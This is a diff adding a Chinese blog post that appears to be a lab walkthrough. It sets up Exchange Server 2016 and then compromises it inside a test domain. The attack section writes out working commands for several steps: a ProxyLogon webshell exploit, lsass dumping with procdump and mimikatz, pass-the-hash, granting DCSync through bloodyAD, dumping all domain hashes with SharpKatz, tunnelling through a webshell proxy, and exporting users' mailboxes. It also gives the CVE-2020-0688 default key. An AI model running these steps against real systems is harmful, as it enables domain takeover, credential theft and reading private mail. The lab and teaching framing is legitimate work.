@@ -1,0 +1,293 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>exchange专题 | caixiaoguan's Blog</title><meta name="author" content="caixiaoguan"><meta name="copyright" content="caixiaoguan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="exchange服务器安装环境：windows server 2016 、exchange server 2016 cu12 搭建流程： 1）配置windows server 2016 网络、计算机名，加入域 2）域管账户登录域机器，运行exchange的setup.exe 3）不使用推荐设置、不检查更新、禁用恶意软件扫描 4）根据报错和所给链接安装相应的前提条件 12345678910AD组件安">
+<meta property="og:type" content="article">
+<meta property="og:title" content="exchange专题">
+<meta property="og:url" content="http://example.com/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/index.html">
+<meta property="og:site_name" content="caixiaoguan&#39;s Blog">
+<meta property="og:description" content="exchange服务器安装环境：windows server 2016 、exchange server 2016 cu12 搭建流程： 1）配置windows server 2016 网络、计算机名，加入域 2）域管账户登录域机器，运行exchange的setup.exe 3）不使用推荐设置、不检查更新、禁用恶意软件扫描 4）根据报错和所给链接安装相应的前提条件 12345678910AD组件安">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/my.jpg">
+<meta property="article:published_time" content="2023-10-30T06:41:06.000Z">
+<meta property="article:modified_time" content="2025-03-27T17:17:51.509Z">
+<meta property="article:author" content="caixiaoguan">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/my.jpg"><link rel="shortcut icon" href="/img/my.jpg"><link rel="canonical" href="http://example.com/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'exchange专题',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-03-28 01:17:51'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/my.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="caixiaoguan's Blog"><span class="site-name">caixiaoguan's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">exchange专题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-30T06:41:06.000Z" title="发表于 2023-10-30 14:41:06">2023-10-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-27T17:17:51.509Z" title="更新于 2025-03-28 01:17:51">2025-03-28</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="exchange服务器安装"><a href="#exchange服务器安装" class="headerlink" title="exchange服务器安装"></a>exchange服务器安装</h1><p>环境：windows server 2016 、exchange server 2016 cu12</p>
+<p>搭建流程：</p>
+<p>1）配置windows server 2016 网络、计算机名，加入域</p>
+<p>2）域管账户登录域机器，运行exchange的setup.exe</p>
+<p>3）不使用推荐设置、不检查更新、禁用恶意软件扫描</p>
+<p>4）根据报错和所给链接安装相应的前提条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">AD组件安装：</span><br><span class="line">Install-WindowsFeature RSAT-ADDS</span><br><span class="line"></span><br><span class="line">.Net Framework 4.7.1</span><br><span class="line">https://support.microsoft.com/zh-cn/topic/%E9%80%82%E7%94%A8%E4%BA%8E-windows-%E7%9A%84-net-framework-4-7-1-%E8%84%B1%E6%9C%BA%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F-2a7d0d5e-92f2-b12d-aed4-4f5d14c8ef0c</span><br><span class="line"></span><br><span class="line">UCMA 4.0</span><br><span class="line">https://www.microsoft.com/zh-cn/download/details.aspx?id=34992</span><br><span class="line"></span><br><span class="line">kb3206632</span><br></pre></td></tr></table></figure>
+
+<p>5）前提条件安装后，还要注意将所有域控打开，否则第一步会因为无法复制相应信息报错</p>
+<p>6）IE打开链接：<a target="_blank" rel="noopener" href="http://localhost/ecp%EF%BC%8C%E7%94%A8%E5%9F%9F%E7%AE%A1%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E7%AE%A1%E7%90%86%E4%B8%AD%E5%BF%83">http://localhost/ecp，用域管账户登录管理中心</a></p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689235022283-f2534ebd-26d6-49c5-ac9e-5549e6f55ffa.png"></p>
+<ol start="7">
+<li>管理员添加邮件用户,从域中选择域用户添加（注意：创建和删除用户，都会同步到域中）</li>
+</ol>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689235207770-8c10f814-0b59-4be6-ab92-075ee6f12a63.png"></p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689235276952-7d5afda6-0db9-47c0-8daa-6030c5be5123.png"></p>
+<p>8）登录域用户邮箱的exchange管理中心 ：<a target="_blank" rel="noopener" href="https://exchange.com/ecp">https://exchange.com/ecp</a></p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689235477917-af8d4b0a-3813-4a73-ac81-7f2dea80d604.png"></p>
+<p>9）登录exchange客户端：<a target="_blank" rel="noopener" href="https://exchange.com/">https://exchange.com</a></p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689235739144-79305561-eb41-4f5d-99b5-819e5967003d.png"></p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689235787024-93021306-8136-40a0-ba39-a94aa1dc077a.png"></p>
+<h1 id="exchange-服务器攻击"><a href="#exchange-服务器攻击" class="headerlink" title="exchange 服务器攻击"></a>exchange 服务器攻击</h1><p><strong>环境：</strong></p>
+<p><strong>1）exchange双卡192.168.202.205、10.10.10.7，且exchange服务器不能出网，但外网主机能访问到它；</strong></p>
+<p><strong>2）拿下一个域用户：即账号+hash</strong></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="1）发现并锁定exchange服务器"><a href="#1）发现并锁定exchange服务器" class="headerlink" title="1）发现并锁定exchange服务器"></a>1）发现并锁定exchange服务器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用spn发现exchange服务</span><br><span class="line">setspn -T hack-guan.com -F -Q */* |findstr exchange</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689236994639-70428abd-75ce-4294-8577-03a73490bf48.png"></p>
+<h3 id="端口指纹识别"><a href="#端口指纹识别" class="headerlink" title="端口指纹识别"></a>端口指纹识别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">端口扫描识别指纹信息：</span><br><span class="line">nmap -A -O -sV -Pn 192.168.202.205</span><br><span class="line"></span><br><span class="line">使用nmap的NTLM信息收集脚本收集exchange 服务器信息</span><br><span class="line">nmap 192.168.202.205 -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689248724882-1216e45c-e011-409c-93d4-5f1d3a24dfb2.png"></p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689249245736-8a4dc6a5-d9f7-4c1b-9fe6-24ea3a30c58b.png"></p>
+<h3 id="获取exchange服务器版本信息"><a href="#获取exchange服务器版本信息" class="headerlink" title="获取exchange服务器版本信息"></a>获取exchange服务器版本信息</h3><p>在登录界面F12</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689249468496-4f142076-b0b0-47d3-b5fb-7a781e8baedf.png"></p>
+<p>获取更详细版本：</p>
+<p>访问&#x2F;owa接口（持续记录看包即可）</p>
+<p>官方查看版本</p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019">https://learn.microsoft.com/zh-cn/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019</a></p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689250110213-9984337a-1c14-4af3-8ccd-745d93cbef5e.png"></p>
+<h2 id="接口爆破"><a href="#接口爆破" class="headerlink" title="接口爆破"></a>接口爆破</h2><h3 id="检测可爆破的接口"><a href="#检测可爆破的接口" class="headerlink" title="检测可爆破的接口"></a>检测可爆破的接口</h3><p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689561494677-1ff49566-ddd9-436c-86ff-f5fd067ef4a0.png"></p>
+<h3 id="选择相应接口爆破"><a href="#选择相应接口爆破" class="headerlink" title="选择相应接口爆破"></a>选择相应接口爆破</h3><h4 id="建立代理"><a href="#建立代理" class="headerlink" title="建立代理"></a>建立代理</h4><p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689561789617-48b567a2-a52d-4828-85b0-799843b93caa.png"></p>
+<h4 id="导出活动目录"><a href="#导出活动目录" class="headerlink" title="导出活动目录"></a>导出活动目录</h4><p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689561733920-e7d59f5e-0911-4291-9978-ee4779eb3349.png"></p>
+<h4 id="获取邮箱账号"><a href="#获取邮箱账号" class="headerlink" title="获取邮箱账号"></a>获取邮箱账号</h4><p>从导出的活动目录获取邮箱账户</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689562001686-7391d8ab-61f7-4dce-b0e9-8b4374687849.png"></p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689562020806-febe3fed-42d0-43b1-8c0f-0eb0948e841e.png"></p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689562036562-30c98ac5-70e6-4f76-a369-6fcad85eb002.png"></p>
+<h4 id="生成爆破用的user-txt和密码字典pass-txt"><a href="#生成爆破用的user-txt和密码字典pass-txt" class="headerlink" title="生成爆破用的user.txt和密码字典pass.txt"></a>生成爆破用的user.txt和密码字典pass.txt</h4><h2 id="探测漏洞"><a href="#探测漏洞" class="headerlink" title="探测漏洞"></a>探测漏洞</h2><h3 id="CVE-2021-26855"><a href="#CVE-2021-26855" class="headerlink" title="CVE-2021-26855"></a>CVE-2021-26855</h3><p><font style="color:rgb(51, 51, 51);">Exchange服务器端请求伪造漏洞（CVE-2021-26855）</font></p>
+<h4 id="使用到的命令"><a href="#使用到的命令" class="headerlink" title="使用到的命令"></a>使用到的命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">利用cve-2021-26855漏洞脚本生成websehll：</span><br><span class="line">python3 ProxyLogon.py --host=192.168.202.205 --mail=Administrator@hack-guan.com</span><br><span class="line">    --host: target&#x27;s address.</span><br><span class="line">    --mail: exists user&#x27;s mail.</span><br><span class="line">    --mails: mails file.</span><br><span class="line"></span><br><span class="line">procdump导出lsass进程文件：</span><br><span class="line">procdump64 -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"></span><br><span class="line">mimikatz本地导出hash：</span><br><span class="line">Sekurlsa::minidump lsass.dmp</span><br><span class="line">Sekurlsa::logonpasswords full</span><br><span class="line"></span><br><span class="line">建立chunk-Proxy代理：</span><br><span class="line">java -jar chunk-Proxy.jar .net 1080 https://192.168.202.205/aspnet_client/proxy.aspx</span><br><span class="line"></span><br><span class="line">bloodyAD利用exchange$账户赋予dcsync权限：</span><br><span class="line">proxychains3 python3 bloodyAD.py -d hack-guan.com -u exchange$ -p :690f662f7f12700eae9e1c65dcd648be --host 10.10.10.10 add dcsync hackweb</span><br><span class="line"></span><br><span class="line">mimikatz进行hash传递：</span><br><span class="line">mimikatz.exe  &quot;sekurlsa::pth /user:hackweb /domain:hack-guan.com /ntlm:3cb48874d4929c7d77183a1f967b8460&quot;</span><br><span class="line"></span><br><span class="line">sharpkatz远程导出所有hash：</span><br><span class="line">SharpKatz.exe --Command dcsync --Domain hack-guan.com --DomainController 10.10.10.10</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="利用公开的poc获得webshell"><a href="#利用公开的poc获得webshell" class="headerlink" title="利用公开的poc获得webshell"></a>利用公开的poc获得webshell</h4><p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689322305039-acbe1bd4-fbea-48e8-8a81-df7499831d1c.png"></p>
+<h4 id="连接webshell"><a href="#连接webshell" class="headerlink" title="连接webshell"></a>连接webshell</h4><p>蚁剑连接，注意忽略https</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689213189048-058f3fdf-6cef-475a-a48b-7e60b67094fa.png"></p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689213215065-32025ecd-9d75-4ca2-a863-3296863fbf2c.png"></p>
+<h4 id="上传工具：代理、导hash"><a href="#上传工具：代理、导hash" class="headerlink" title="上传工具：代理、导hash"></a>上传工具：代理、导hash</h4><p>上传procdump和代理网马（直接上传mimikatz会被windows defender杀掉）</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689213278363-c417547a-d456-4245-9229-fdc096c7862e.png"></p>
+<h4 id="利用procdump导出lsass文件"><a href="#利用procdump导出lsass文件" class="headerlink" title="利用procdump导出lsass文件"></a>利用procdump导出lsass文件</h4><p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689213645234-6093ce19-a7ff-4282-803f-cf68448eb84a.png"></p>
+<h4 id="本地导出hash"><a href="#本地导出hash" class="headerlink" title="本地导出hash"></a>本地导出hash</h4><p>用蚁剑将导出的lsass.dmp文件下载到本地，并用mimikatz导出exchange$的hash</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689214074122-43510f7e-190c-42e3-b443-a7366a665f2a.png"></p>
+<h4 id="建立socks5代理"><a href="#建立socks5代理" class="headerlink" title="建立socks5代理"></a>建立socks5代理</h4><p>建立chunk-proxy代理隧道</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689322629724-40d178ca-adc3-49b5-990d-37ee530bd30c.png"></p>
+<p>windows ：proxifier</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689322690770-b6827d31-ad53-4f05-a503-361a9f32d188.png"></p>
+<p>linux ：proxychains（指向服务器IP）</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689322768807-3b9e52ba-4b58-4b9f-8fba-3bc192c52d06.png"></p>
+<h4 id="给拿下的域用户赋予DCSync功能"><a href="#给拿下的域用户赋予DCSync功能" class="headerlink" title="给拿下的域用户赋予DCSync功能"></a>给拿下的域用户赋予DCSync功能</h4><p>利用exchange$的WriteDAcl功能为我们拿下的域用户hackweb授予DCSync功能</p>
+<p>使用bloodyAD.py+exchange$ 的ntlm hash 为hackweb授予DCSync功能</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689322981010-20553832-ba67-493d-9d2e-bd4e1be59287.png"></p>
+<h4 id="本地远程导出域所有hash"><a href="#本地远程导出域所有hash" class="headerlink" title="本地远程导出域所有hash"></a>本地远程导出域所有hash</h4><p>本地进行hash传递hackweb，利用DCSync功能获取域中所有用户hash</p>
+<p>mimikatz进行hash传递、SharpKatz进行远程导出域中所有用户hash</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689323324865-232389a6-ef5c-4ec8-b911-0cd9921f5a97.png"></p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689323442395-48690f48-fb9c-4cbb-b33b-2940e8e55570.png"></p>
+<h3 id="其他拿shell方式"><a href="#其他拿shell方式" class="headerlink" title="其他拿shell方式"></a>其他拿shell方式</h3><h4 id="cve-2020-0688"><a href="#cve-2020-0688" class="headerlink" title="cve-2020-0688"></a>cve-2020-0688</h4><p>打（keygetshell也行）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">--validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（旧版本默认，漏洞产生原因，新版本去掉或者重新生成）</span><br><span class="line"></span><br><span class="line">--validationalg = SHA1（默认，漏洞产生原因）</span><br><span class="line"></span><br><span class="line">--generator=B97B4E27（基本默认）正常登录后访问/ecp/default.aspx 页面，Response选项卡搜索__VIEWSTATEGENERATOR获取字段值</span><br><span class="line"></span><br><span class="line">--viewstateuserkey = ASP.NET_SessionId（手工获取，变量，每次登陆都不一致,有validationkey也可以认证）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exchange Server 2013 sp3、cu23</span><br><span class="line">Exchange Server 2016 cu14-15</span><br><span class="line">exchange server 2019 cu3-4</span><br></pre></td></tr></table></figure>
+<p>维权<br>获取改变后的validationkey，使用keygetshell重新打<br>相关链接：<a target="_blank" rel="noopener" href="https://fdlucifer.github.io/2020/10/12/cve-2020-0688/">https://fdlucifer.github.io/2020/10/12/cve-2020-0688/</a></p>
+<h4 id="proxysehll"><a href="#proxysehll" class="headerlink" title="proxysehll"></a>proxysehll</h4><p>（cve-2021-34473 + cve-2021-31207 + cve-2021-34523）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Exchange Server 2013 cu23</span><br><span class="line">Exchange Server 2016 cu19-20</span><br><span class="line">exchange server 2019 cu8-9</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="cve-2020-17144"><a href="#cve-2020-17144" class="headerlink" title="cve-2020-17144"></a>cve-2020-17144</h4><p>经过身份认证的远程代码执行，要邮箱凭证，且版本要很低<br>Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 31</p>
+<h2 id="exchange导出邮件"><a href="#exchange导出邮件" class="headerlink" title="exchange导出邮件"></a>exchange导出邮件</h2><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">获取exchange的默认安装路径：</span><br><span class="line">echo %ExchangeInstallPath%</span><br><span class="line"></span><br><span class="line">获取所有邮箱信息：</span><br><span class="line">Powershell.exe -psconsolefile &quot;C:\\program files\\Microsoft\\Exchange Server\\v15\\Bin\\exshell.psc1&quot; -command &quot;Get-Mailbox -ResultSize unlimited&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">获取邮件跟踪日志：</span><br><span class="line">copy &quot;\\10.10.10.7\c$\Program Files\Microsoft\Exchange Server\V15\TransportRoles\Logs\MessageTracking&quot; c:\users\administrator\desktop\exchange</span><br><span class="line"></span><br><span class="line">导出并筛选用户邮箱内容（最后copy回本地）：</span><br><span class="line">Powershell.exe -psconsolefile &quot;C:\\program files\\Microsoft\\Exchange Server\\v15\\Bin\\exshell.psc1&quot; -command &quot;New-MailboxExportrequest -mailbox exchange -filepath &#x27;\\localhost\c$\exchange1.pst&#x27;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="获取exchange的默认安装路径"><a href="#获取exchange的默认安装路径" class="headerlink" title="获取exchange的默认安装路径"></a>获取exchange的默认安装路径</h4><p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689349006295-33e540ef-e347-424d-9f6a-f793b0405506.png"></p>
+<h4 id="获取所有邮箱信息"><a href="#获取所有邮箱信息" class="headerlink" title="获取所有邮箱信息"></a>获取所有邮箱信息</h4><p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689396264582-e3f6cdee-3ce0-44cf-9e3f-7818782f1b4d.png"></p>
+<h4 id="获取邮件跟踪日志并分析"><a href="#获取邮件跟踪日志并分析" class="headerlink" title="获取邮件跟踪日志并分析"></a>获取邮件跟踪日志并分析</h4><p>建立chunk-proxy代理</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689348708471-d92b54bf-8a04-4801-bce0-56d3cf73fa4f.png"></p>
+<p>利用exchange$的hash进行hash传递，在弹窗中进行IPC$连接，dir目录，copy跟踪日志到本地</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689350030595-9b9d986f-e091-486f-ad7e-efa039357726.png"></p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689350134779-41163712-c39e-4699-a84c-5bff4fefab4e.png"></p>
+<p>用py脚本将跟踪日志的邮件流向、时间、用户名导出，以便观察整个邮件流向</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689485941383-67f128c3-7712-43d6-b11d-cced76358cc7.png"></p>
+<h4 id="导出并筛选用户邮箱内容"><a href="#导出并筛选用户邮箱内容" class="headerlink" title="导出并筛选用户邮箱内容"></a>导出并筛选用户邮箱内容</h4><p>导出exchange1的邮件内容</p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689396730573-300fa90b-8a67-40d4-8fb1-cec9ec4548ba.png"></p>
+<p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689350520003-f558e45b-4ba0-4f4e-9149-2d56d4b3c34e.png"></p>
+<h4 id="net-use下copy回本地"><a href="#net-use下copy回本地" class="headerlink" title="net use下copy回本地"></a>net use下copy回本地</h4><p><img src="/2023/10/30/exchange%E4%B8%93%E9%A2%98/exchange%E4%B8%93%E9%A2%98/1689350673289-9b1e221a-4e04-4e85-90e6-c9602a08c76a.png"></p>
+<p>缺点：powershell是敏感进程，会留下很多记录</p>
